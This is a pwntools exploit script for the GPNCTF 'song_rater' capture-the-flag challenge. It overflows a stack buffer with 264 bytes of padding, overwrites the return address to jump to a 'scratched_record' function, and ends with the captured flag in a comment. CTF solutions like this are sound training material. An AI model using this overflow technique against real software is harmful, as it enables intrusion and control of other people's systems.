from pwn import *
# fill in binary name
elf = context.binary = ELF("./song_rater")

if args.REMOTE:
  # fill in remote address
  p = remote("spaceman--babylon-zoo-5504.ctf.kitctf.de", "443", ssl=True)
elif args.REMOTE2:
  p = remote("localhost", 40003)
elif args.GDB:
  context.terminal = ["tmux", "splitw", "-h"]
  p = gdb.debug(binary, gdbscript=gs)
else:
  p = elf.process()

# create exploit here
# scratched_record addr: 0x00401196
p.recvuntil(b'song:\n')
payload = b'a' * (256 + 8)
payload += p64(0x00401196)


# pause()
p.sendline(payload)
p.interactive()
# GPNCTF{G00d_n3w5!_1t_l00ks_l1ke_y0u_r3p41r3d_y0ur_disk...}